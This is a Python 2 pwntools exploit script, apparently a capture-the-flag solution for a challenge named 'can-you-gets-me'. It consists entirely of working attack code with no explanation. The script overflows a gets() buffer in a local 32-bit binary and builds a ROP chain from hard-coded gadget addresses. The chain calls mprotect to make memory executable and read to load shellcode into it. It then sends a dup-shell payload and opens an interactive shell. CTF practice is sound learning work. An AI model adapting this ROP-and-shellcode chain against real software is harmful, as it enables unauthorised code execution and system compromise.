#!/usr/bin/python2
#Author: Wh04m1 (@filip_dragovic)

from pwn import *
import time
#context(terminal=['konsole','--new-tab', '-e'])
context(os='linux', arch='i386')
#context.log_level='DEBUG'
p = process("/problems/can-you-gets-me_0_8ac5bddeab74e647cd6d31642246a12a/gets")
#p = gdb.debug("./gets", 'b main')
shellcode = asm(shellcraft.i386.linux.dupsh())
addr = p32(0x080e9000)
popeax = p32(0x080b81c6)
popecx = p32(0x080de955)
popebx = p32(0x080481c9)
popedx = p32(0x0806f02a)
popedi = p32(0x08048480)
int_80 = p32(0x0806f630)

payload = cyclic(28)
payload +=  popeax
payload += p32(125) #mprotect 
payload += popebx
payload += addr    #addres
payload += popedx
payload += p32(0x7) # permissions
payload += popecx
payload += p32(0x1000) # lenght 
payload += int_80 # syscall
payload += popeax
payload += p32(3) #read
payload += popecx 
payload += addr # address
payload += popebx
payload += p32(0)# fd = stdin
payload += popedx
payload += p32(1000) # lenght 
payload += int_80 # syscall
payload += addr #  address
time.sleep(1)
p.recvuntil("NAME!")
p.sendline(payload)
p.sendline(shellcode)
p.interactive()
